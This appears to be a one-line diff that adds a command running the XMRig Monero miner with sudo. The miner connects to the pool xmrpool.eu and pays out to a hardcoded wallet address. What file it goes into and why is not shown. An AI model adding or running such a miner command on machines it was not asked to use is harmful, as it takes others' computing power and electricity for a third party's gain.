@@ -1,0 +1,1 @@
+ cd xmrig-6.22.1/ && sudo ./xmrig -o xmrpool.eu:9999 -u 481Vh5SsbQ79H61xuaVNXMb7NjcCHWsxa7VGN2GZs1v4ddRj5Wib3WPRxWq6DEnKw3hcCf8Hh7pLn1om4Y1EobVfGTh3fSt -k --tls --coin monero
